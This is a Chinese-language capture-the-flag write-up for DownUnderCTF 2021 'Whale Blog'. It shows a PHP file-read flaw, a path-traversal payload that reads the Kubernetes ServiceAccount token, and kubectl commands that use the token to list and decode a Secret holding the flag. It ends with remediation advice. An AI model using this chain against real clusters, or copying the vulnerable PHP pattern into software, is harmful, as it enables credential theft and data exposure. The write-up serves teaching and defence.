# DownUnderCTF 2021 - Whale Blog

## 题目简述

题目入口是一个运行在 Kubernetes Pod 中的 PHP 博客。`page` 参数被直接拼到相对路径后交给 `file_get_contents`，形成任意文件读取；页面源码还泄露了 Kubernetes API 的另一个域名。Web LFI 只是取得 Pod 身份的入口，决定 flag 的主要障碍是 Kubernetes 自动挂载的 ServiceAccount token 与过宽的 RBAC 权限，因此归入 `cloud-infra`。

关键 PHP 逻辑为：

```php
$file = $_GET["page"];
if (!empty($file)) {
    echo "<pre>";
    echo file_get_contents('./' . $file);
    echo "</pre>";
}
```

集群把 `default` ServiceAccount 绑定到一个允许 `get`、`list` Secret 的 Role：

```yaml
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
subjects:
  - kind: ServiceAccount
    name: default
```

## 解题过程

先用目录穿越验证任意文件读取，例如读取 `/etc/passwd`。由于应用运行在 Pod 中，默认 ServiceAccount 凭据通常挂载在固定目录：

```text
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
```

因此通过 `page` 参数读取 token：

```text
?page=../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
```

不要把比赛 token 写入长期 WP。将响应保存为 `token` 后，连接页面注释泄露的 Kubernetes API 地址并枚举当前身份的能力：

```bash
kubectl \
  --server='https://<kubernetes-api>' \
  --token="$(cat token)" \
  auth can-i --list
```

结果表明该身份可以在 `default` namespace 中列举和读取 Secret。先列出名称，再读取异常的 Opaque Secret：

```bash
kubectl --server='https://<kubernetes-api>' --token="$(cat token)" \
  get secrets

kubectl --server='https://<kubernetes-api>' --token="$(cat token)" \
  get secret nooooo-dont-read-me -o json
```

`data.so-secret-though` 是 Kubernetes Secret 的 Base64 字段，可以直接解码：

```bash
kubectl --server='https://<kubernetes-api>' --token="$(cat token)" \
  get secret nooooo-dont-read-me \
  -o jsonpath='{.data.so-secret-though}' | base64 -d
```

输出为：

```text
DUCTF{g00nies_got_th1s_l4st_year_now_u_did!}
```

## 方法总结

完整利用链是 `LFI -> Pod ServiceAccount token -> Kubernetes API -> RBAC 读取 Secret`。看到容器内任意文件读取时，应检查 ServiceAccount token、namespace 和 CA 证书等平台凭据；取得 token 后先用 `kubectl auth can-i --list` 明确权限边界，再针对允许的资源操作。修复不仅要消除 LFI，还应关闭不必要的 token 自动挂载，并避免把 `secrets get/list` 授给默认 ServiceAccount。
